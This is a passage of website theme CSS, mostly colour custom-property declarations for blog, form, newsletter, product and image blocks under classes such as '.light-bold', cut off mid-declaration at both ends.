yButtonTextColor:hsla(var(--safeInverseDarkAccent-hsl),1);--secondaryButtonBackgroundColor:hsla(var(--safeDarkAccent-hsl),1);--secondaryButtonTextColor:hsla(var(--safeInverseDarkAccent-hsl),1);--section-divider-stroke-color:hsla(var(--safeDarkAccent-hsl),1);--section-inset-border-color:hsla(var(--lightAccent-hsl),1);--shape-block-background-color:hsla(var(--white-hsl),1);--shape-block-dropshadow-color:hsla(var(--white-hsl),1);--shape-block-stroke-color:hsla(var(--safeDarkAccent-hsl),1);--siteBackgroundColor:hsla(var(--lightAccent-hsl),1);--siteTitleColor:hsla(var(--black-hsl),1);--social-links-block-main-icon-color:hsla(var(--black-hsl),1);--social-links-block-secondary-icon-color:hsla(var(--lightAccent-hsl),1);--solidHeaderBackgroundColor:hsla(var(--white-hsl),1);--solidHeaderBorderColor:hsla(var(--black-hsl),1);--solidHeaderDropShadowColor:hsla(var(--black-hsl),1);--solidHeaderNavigationColor:hsla(var(--black-hsl),1);--summary-block-limited-availability-label-color:hsla(var(--black-hsl),1);--tertiaryButtonBackgroundColor:hsla(var(--safeDarkAccent-hsl),1);--tertiaryButtonTextColor:hsla(var(--safeInverseDarkAccent-hsl),1);--text-highlight-color:hsla(var(--safeDarkAccent-hsl),1);--text-highlight-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-accordion-block-background-color:hsla(var(--white-hsl),1);--tweak-accordion-block-divider-color:hsla(var(--black-hsl),1);--tweak-accordion-block-divider-color-on-background:hsla(var(--black-hsl),1);--tweak-accordion-block-icon-color:hsla(var(--black-hsl),1);--tweak-accordion-block-icon-color-on-background:hsla(var(--black-hsl),1);--tweak-blog-alternating-side-by-side-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-alternating-side-by-side-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-alternating-side-by-side-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-alternating-side-by-side-list-title-color:hsla(var(--black-hsl),1);--tweak-blog-basic-grid-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-basic-grid-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-basic-grid-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-basic-grid-list-title-color:hsla(var(--black-hsl),1);--tweak-blog-item-author-profile-color:hsla(var(--black-hsl),1);--tweak-blog-item-comment-meta-color:hsla(var(--black-hsl),1);--tweak-blog-item-comment-text-color:hsla(var(--black-hsl),1);--tweak-blog-item-meta-color:hsla(var(--black-hsl),1);--tweak-blog-item-pagination-icon-color:hsla(var(--black-hsl),1);--tweak-blog-item-pagination-meta-color:hsla(var(--black-hsl),1);--tweak-blog-item-pagination-title-color:hsla(var(--black-hsl),1);--tweak-blog-item-title-color:hsla(var(--black-hsl),1);--tweak-blog-masonry-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-masonry-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-masonry-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-masonry-list-title-color:hsla(var(--black-hsl),1);--tweak-blog-side-by-side-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-side-by-side-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-side-by-side-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-side-by-side-list-title-color:hsla(var(--black-hsl),1);--tweak-blog-single-column-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-single-column-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-single-column-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-single-column-list-title-color:hsla(var(--black-hsl),1);--tweak-content-link-block-title-color:hsla(var(--black-hsl),1);--tweak-events-item-pagination-date-color:hsla(var(--black-hsl),1);--tweak-events-item-pagination-icon-color:hsla(var(--black-hsl),1);--tweak-events-item-pagination-title-color:hsla(var(--black-hsl),1);--tweak-form-block-background-color:hsla(var(--white-hsl),1);--tweak-form-block-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-button-background-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-form-block-button-text-color-on-background:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-form-block-caption-color:hsla(var(--black-hsl),1);--tweak-form-block-caption-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-description-color:hsla(var(--black-hsl),1);--tweak-form-block-description-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-option-color:hsla(var(--black-hsl),1);--tweak-form-block-option-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-survey-title-color:hsla(var(--black-hsl),1);--tweak-form-block-survey-title-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-title-color:hsla(var(--black-hsl),1);--tweak-form-block-title-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-fill-color:hsla(var(--white-hsl),1);--tweak-form-block-field-fill-color-hsl:var(--white-hsl);--tweak-form-block-field-fill-color-a:1;--tweak-form-block-field-border-color:hsla(var(--black-hsl),1);--tweak-form-block-field-border-color-hsl:var(--black-hsl);--tweak-form-block-field-border-color-a:1;--tweak-form-block-field-input-color:hsla(var(--black-hsl),1);--tweak-form-block-field-input-color-hsl:var(--black-hsl);--tweak-form-block-field-input-color-a:1;--tweak-form-block-field-accessory-color:hsla(var(--black-hsl),1);--tweak-form-block-field-fill-color-on-background:hsla(var(--lightAccent-hsl),1);--tweak-form-block-field-fill-color-on-background-hsl:var(--lightAccent-hsl);--tweak-form-block-field-fill-color-on-background-a:1;--tweak-form-block-field-border-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-border-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-border-color-on-background-a:1;--tweak-form-block-field-input-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-input-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-input-color-on-background-a:1;--tweak-form-block-field-accessory-color-on-background:hsla(var(--black-hsl),1);--tweak-gallery-icon-background-color:hsla(var(--lightAccent-hsl),1);--tweak-gallery-icon-color:hsla(var(--black-hsl),1);--tweak-gallery-lightbox-background-color:hsla(var(--lightAccent-hsl),1);--tweak-gallery-lightbox-icon-color:hsla(var(--black-hsl),1);--tweak-heading-extra-large-color-on-background:hsla(var(--black-hsl),1);--tweak-heading-large-color-on-background:hsla(var(--black-hsl),1);--tweak-heading-medium-color-on-background:hsla(var(--black-hsl),1);--tweak-heading-small-color-on-background:hsla(var(--black-hsl),1);--tweak-line-block-line-color:hsla(var(--black-hsl),1);--tweak-marquee-block-background-color:hsla(var(--white-hsl),1);--tweak-marquee-block-heading-color:hsla(var(--black-hsl),1);--tweak-marquee-block-heading-color-on-background:hsla(var(--black-hsl),1);--tweak-marquee-block-paragraph-color:hsla(var(--black-hsl),1);--tweak-marquee-block-paragraph-color-on-background:hsla(var(--black-hsl),1);--tweak-menu-block-item-description-color:hsla(var(--black-hsl),1);--tweak-menu-block-item-price-color:hsla(var(--black-hsl),1);--tweak-menu-block-item-title-color:hsla(var(--black-hsl),1);--tweak-menu-block-nav-color:hsla(var(--black-hsl),1);--tweak-menu-block-title-color:hsla(var(--black-hsl),1);--tweak-newsletter-block-background-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-button-background-color-on-background:hsla(var(--black-hsl),1);--tweak-newsletter-block-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-newsletter-block-button-text-color-on-background:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-newsletter-block-description-color:hsla(var(--black-hsl),1);--tweak-newsletter-block-description-color-on-background:hsla(var(--black-hsl),1);--tweak-newsletter-block-footnote-color:hsla(var(--black-hsl),1);--tweak-newsletter-block-footnote-color-on-background:hsla(var(--black-hsl),1);--tweak-newsletter-block-title-color:hsla(var(--black-hsl),1);--tweak-newsletter-block-title-color-on-background:hsla(var(--black-hsl),1);--tweak-paragraph-large-color-on-background:hsla(var(--black-hsl),1);--tweak-paragraph-link-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-paragraph-medium-color-on-background:hsla(var(--black-hsl),1);--tweak-paragraph-small-color-on-background:hsla(var(--black-hsl),1);--tweak-portfolio-item-pagination-icon-color:hsla(var(--black-hsl),1);--tweak-portfolio-item-pagination-meta-color:hsla(var(--black-hsl),1);--tweak-portfolio-item-pagination-title-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-breadcumb-nav-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-description-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-gallery-controls-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-product-basic-item-price-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-scarcity-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-title-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-variant-fields-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-category-nav-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-pagination-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-price-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-scarcity-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-status-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-title-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-button-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-controls-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-overlay-color:hsla(var(--white-hsl),1);--tweak-quote-block-background-color:hsla(var(--white-hsl),1);--tweak-quote-block-source-color:hsla(var(--black-hsl),1);--tweak-quote-block-source-color-on-background:hsla(var(--black-hsl),1);--tweak-quote-block-text-color:hsla(var(--black-hsl),1);--tweak-quote-block-text-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-background-color:hsla(var(--white-hsl),1);--tweak-summary-block-excerpt-color:hsla(var(--black-hsl),1);--tweak-summary-block-excerpt-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-header-text-color:hsla(var(--black-hsl),1);--tweak-summary-block-header-text-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-primary-metadata-color:hsla(var(--black-hsl),1);--tweak-summary-block-primary-metadata-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-read-more-color:hsla(var(--black-hsl),1);--tweak-summary-block-read-more-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-secondary-metadata-color:hsla(var(--black-hsl),1);--tweak-summary-block-secondary-metadata-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-title-color:hsla(var(--black-hsl),1);--tweak-summary-block-title-color-on-background:hsla(var(--black-hsl),1);--tweak-text-block-background-color:hsla(var(--white-hsl),1);--tweak-video-item-description-color:hsla(var(--black-hsl),1);--tweak-video-item-meta-color:hsla(var(--black-hsl),1);--tweak-video-item-pagination-icon-color:hsla(var(--black-hsl),1);--tweak-video-item-pagination-title-color:hsla(var(--black-hsl),1);--tweak-video-item-title-color:hsla(var(--black-hsl),1);--video-grid-basic-description-color:hsla(var(--black-hsl),1);--video-grid-basic-meta-color:hsla(var(--black-hsl),1);--video-grid-basic-title-color:hsla(var(--black-hsl),1);--video-grid-category-nav-color:hsla(var(--black-hsl),1);}.light-bold {--announcement-bar-background-color:hsla(var(--accent-hsl),1);--announcement-bar-text-color:hsla(var(--safeInverseAccent-hsl),1);--backgroundOverlayColor:hsla(var(--lightAccent-hsl),1);--course-item-nav-active-lesson-background-color:hsla(var(--darkAccent-hsl),1);--course-item-nav-active-lesson-text-color:hsla(var(--white-hsl),1);--course-item-nav-background-color:hsla(var(--white-hsl),1);--course-item-nav-border-color:hsla(var(--black-hsl),0.25);--course-item-nav-text-color:hsla(var(--black-hsl),1);--course-list-course-progress-bar-color:hsla(var(--darkAccent-hsl),1);--course-list-course-item-background:hsla(var(--white-hsl),1);--course-list-course-item-hover-background:hsla(var(--white-hsl),0.75);--course-list-course-item-text-color:hsla(var(--black-hsl),1);--course-list-course-chapter-divider-color:hsla(var(--lightAccent-hsl),1);--course-list-grid-layout-chapter-divider-color:hsla(var(--safeDarkAccent-hsl),1);--course-list-grid-layout-course-item-background-color:hsla(var(--white-hsl),1);--course-list-grid-layout-course-item-hover-background-color:hsla(var(--white-hsl),0.75);--course-list-grid-layout-course-item-text-color:hsla(var(--black-hsl),1);--course-list-grid-layout-course-item-border-color:hsla(var(--accent-hsl),1);--gradientHeaderBackgroundColor:hsla(var(--white-hsl),1);--gradientHeaderBorderColor:hsla(var(--black-hsl),1);--gradientHeaderDropShadowColor:hsla(var(--black-hsl),1);--gradientHeaderNavigationColor:hsla(var(--black-hsl),1);--headerDropShadowColor:hsla(var(--black-hsl),1);--headerBorderColor:hsla(var(--black-hsl),1);--headingExtraLargeColor:hsla(var(--safeDarkAccent-hsl),1);--headingLargeColor:hsla(var(--safeDarkAccent-hsl),1);--headingLinkColor:hsla(var(--safeDarkAccent-hsl),1);--headingMediumColor:hsla(var(--safeDarkAccent-hsl),1);--headingSmallColor:hsla(var(--safeDarkAccent-hsl),1);--image-block-card-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-card-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-card-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-card-image-subtitle-color:hsla(var(--black-hsl),1);--image-block-card-image-title-bg-color:hsla(var(--lightAccent-hsl),0);--image-block-card-image-title-color:hsla(var(--black-hsl),1);--image-block-card-inline-link-color:hsla(var(--black-hsl),1);--image-block-collage-background-color:hsla(var(--white-hsl),1);--image-block-collage-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-collage-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-collage-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-collage-image-subtitle-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-collage-image-title-bg-color:hsla(var(--lightAccent-hsl),0);--image-block-collage-image-title-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-collage-inline-link-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-overlap-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-overlap-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-overlap-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-overlap-image-subtitle-color:hsla(var(--black-hsl),1);--image-block-overlap-image-title-bg-color:hsla(var(--lightAccent-hsl),1);--image-block-overlap-image-title-color:hsla(var(--black-hsl),1);--image-block-overlap-inline-link-color:hsla(var(--black-hsl),1);--image-block-overlay-color:hsla(var(--black-hsl),0.5);--image-block-poster-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-poster-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-poster-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-poster-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-poster-image-title-bg-color-v2:hsla(var(--lightAccent-hsl),0);--image-block-poster-image-title-color:hsla(var(--white-hsl),1);--image-block-poster-inline-link-color:hsla(var(--white-hsl),1);--image-block-stack-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-stack-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-stack-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-stack-image-subtitle-color:hsla(var(--black-hsl),1);--image-block-stack-image-title-bg-color:hsla(var(--lightAccent-hsl),0);--image-block-stack-image-title-color:hsla(var(--black-hsl),1);--image-block-stack-inline-link-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-arrow-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-arrow-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-banner-slideshow-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-banner-slideshow-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-banner-slideshow-card-color:hsla(var(--white-hsl),1);--list-section-banner-slideshow-card-description-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-card-description-link-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-card-title-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-description-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-title-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-arrow-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-arrow-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-carousel-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-carousel-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-carousel-card-color:hsla(var(--white-hsl),1);--list-section-carousel-card-description-color:hsla(var(--black-hsl),1);--list-section-carousel-card-description-link-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-card-title-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-description-color:hsla(var(--black-hsl),1);--list-section-carousel-title-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-simple-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-simple-card-color:hsla(var(--white-hsl),1);--list-section-simple-card-description-color:hsla(var(--black-hsl),1);--list-section-simple-card-description-link-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-card-title-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-description-color:hsla(var(--black-hsl),1);--list-section-simple-title-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-title-color:hsla(var(--safeDarkAccent-hsl),1);--menuOverlayBackgroundColor:hsla(var(--lightAccent-hsl),1);--menuOverlayButtonBackgroundColor:hsla(var(--safeDarkAccent-hsl),1);--menuOverlayButtonTextColor:hsla(var(--safeInverseDarkAccent-hsl),1);--menuOverlayNavigationLinkColor:hsla(var(--black-hsl),1);--navigationLinkColor:hsla(var(--black-hsl),1);--paragraphLargeColor:hsla(var(--black-hsl),1);--paragraphLinkColor:hsla(var(--safeDarkAccent-hsl),1);--paragraphMediumColor:hsla(var(--black-hsl),1);--paragraphSmallColor:hsla(var(--black-hsl),1);--portfolio-grid-basic-title-color:hsla(var(--safeDarkAccent-hsl),1);--portfolio-grid-overlay-overlay-color:hsla(var(--lightAccent-hsl),1);--portfolio-grid-overlay-title-color:hsla(var(--black-hsl),1);--portfolio-hover-follow-title-color:hsla(var(--safeDarkAccent-hsl),1);--portfolio-hover-static-title-color:hsla(var(--safeDarkAccent-hsl),1);--portfolio-index-background-title-color:hsla(var(--black-hsl),1);--primaryButtonBackgroundColor:hsla(var(--safeDarkAccent-hsl),1);--primaryButtonTextColor:hsla(var(--safeInverseDarkAccent-hsl),1);--secondaryButtonBackgroundColor:hsla(var(--safeDarkAccent-hsl),1);--secondaryButtonTextColor:hsla(var(--safeInverseDarkAccent-hsl),1);--section-divider-stroke-color:hsla(var(--safeDarkAccent-hsl),1);--section-inset-border-color:hsla(var(--lightAccent-hsl),1);--shape-block-background-color:hsla(var(--white-hsl),1);--shape-block-dropshadow-color:hsla(var(--white-hsl),1);--shape-block-stroke-color:hsla(var(--safeDarkAccent-hsl),1);--siteBackgroundColor:hsla(var(--lightAccent-hsl),1);--siteTitleColor:hsla(var(--safeDarkAccent-hsl),1);--social-links-block-main-icon-color:hsla(var(--black-hsl),1);--social-links-block-secondary-icon-color:hsla(var(--lightAccent-hsl),1);--solidHeaderBackgroundColor:hsla(var(--white-hsl),1);--solidHeaderBorderColor:hsla(var(--black-hsl),1);--solidHeaderDropShadowColor:hsla(var(--black-hsl),1);--solidHeaderNavigationColor:hsla(var(--black-hsl),1);--summary-block-limited-availability-label-color:hsla(var(--black-hsl),1);--tertiaryButtonBackgroundColor:hsla(var(--safeDarkAccent-hsl),1);--tertiaryButtonTextColor:hsla(var(--safeInverseDarkAccent-hsl),1);--text-highlight-color:hsla(var(--safeDarkAccent-hsl),1);--text-highlight-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-accordion-block-background-color:hsla(var(--white-hsl),1);--tweak-accordion-block-divider-color:hsla(var(--black-hsl),1);--tweak-accordion-block-divider-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-accordion-block-icon-color:hsla(var(--black-hsl),1);--tweak-accordion-block-icon-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-alternating-side-by-side-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-alternating-side-by-side-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-alternating-side-by-side-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-alternating-side-by-side-list-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-basic-grid-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-basic-grid-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-basic-grid-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-basic-grid-list-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-item-author-profile-color:hsla(var(--black-hsl),1);--tweak-blog-item-comment-meta-color:hsla(var(--black-hsl),1);--tweak-blog-item-comment-text-color:hsla(var(--black-hsl),1);--tweak-blog-item-meta-color:hsla(var(--black-hsl),1);--tweak-blog-item-pagination-icon-color:hsla(var(--black-hsl),1);--tweak-blog-item-pagination-meta-color:hsla(var(--black-hsl),1);--tweak-blog-item-pagination-title-color:hsla(var(--black-hsl),1);--tweak-blog-item-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-masonry-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-masonry-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-masonry-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-masonry-list-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-side-by-side-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-side-by-side-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-side-by-side-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-side-by-side-list-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-single-column-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-single-column-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-single-column-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-single-column-list-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-content-link-block-title-color:hsla(var(--black-hsl),1);--tweak-events-item-pagination-date-color:hsla(var(--black-hsl),1);--tweak-events-item-pagination-icon-color:hsla(var(--black-hsl),1);--tweak-events-item-pagination-title-color:hsla(var(--black-hsl),1);--tweak-form-block-background-color:hsla(var(--white-hsl),1);--tweak-form-block-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-button-background-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-form-block-button-text-color-on-background:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-form-block-caption-color:hsla(var(--black-hsl),1);--tweak-form-block-caption-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-description-color:hsla(var(--black-hsl),1);--tweak-form-block-description-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-option-color:hsla(var(--black-hsl),1);--tweak-form-block-option-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-survey-title-color:hsla(var(--black-hsl),1);--tweak-form-block-survey-title-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-title-color:hsla(var(--black-hsl),1);--tweak-form-block-title-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-field-fill-color:hsla(var(--white-hsl),1);--tweak-form-block-field-fill-color-hsl:var(--white-hsl);--tweak-form-block-field-fill-color-a:1;--tweak-form-block-field-border-color:hsla(var(--black-hsl),1);--tweak-form-block-field-border-color-hsl:var(--black-hsl);--tweak-form-block-field-border-color-a:1;--tweak-form-block-field-input-color:hsla(var(--black-hsl),1);--tweak-form-block-field-input-color-hsl:var(--black-hsl);--tweak-form-block-field-input-color-a:1;--tweak-form-block-field-accessory-color:hsla(var(--black-hsl),1);--tweak-form-block-field-fill-color-on-background:hsla(var(--lightAccent-hsl),1);--tweak-form-block-field-fill-color-on-background-hsl:var(--lightAccent-hsl);--tweak-form-block-field-fill-color-on-background-a:1;--tweak-form-block-field-border-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-border-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-border-color-on-background-a:1;--tweak-form-block-field-input-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-input-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-input-color-on-background-a:1;--tweak-form-block-field-accessory-color-on-background:hsla(var(--black-hsl),1);--tweak-gallery-icon-background-color:hsla(var(--lightAccent-hsl),1);--tweak-gallery-icon-color:hsla(var(--black-hsl),1);--tweak-gallery-lightbox-background-color:hsla(var(--lightAccent-hsl),1);--tweak-gallery-lightbox-icon-color:hsla(var(--black-hsl),1);--tweak-heading-extra-large-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-heading-large-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-heading-medium-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-heading-small-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-line-block-line-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-marquee-block-background-color:hsla(var(--white-hsl),1);--tweak-marquee-block-heading-color:hsla(var(--black-hsl),1);--tweak-marquee-block-heading-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-marquee-block-paragraph-color:hsla(var(--black-hsl),1);--tweak-marquee-block-paragraph-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-menu-block-item-description-color:hsla(var(--black-hsl),1);--tweak-menu-block-item-price-color:hsla(var(--black-hsl),1);--tweak-menu-block-item-title-color:hsla(var(--black-hsl),1);--tweak-menu-block-nav-color:hsla(var(--black-hsl),1);--tweak-menu-block-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-background-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-button-background-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-newsletter-block-button-text-color-on-background:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-newsletter-block-description-color:hsla(var(--black-hsl),1);--tweak-newsletter-block-description-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-footnote-color:hsla(var(--black-hsl),1);--tweak-newsletter-block-footnote-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-title-color:hsla(var(--black-hsl),1);--tweak-newsletter-block-title-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-paragraph-large-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-paragraph-link-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-paragraph-medium-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-paragraph-small-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-portfolio-item-pagination-icon-color:hsla(var(--black-hsl),1);--tweak-portfolio-item-pagination-meta-color:hsla(var(--black-hsl),1);--tweak-portfolio-item-pagination-title-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-breadcumb-nav-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-description-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-gallery-controls-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-product-basic-item-price-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-scarcity-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-product-basic-item-variant-fields-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-category-nav-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-pagination-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-price-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-scarcity-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-status-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-product-quick-view-button-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-controls-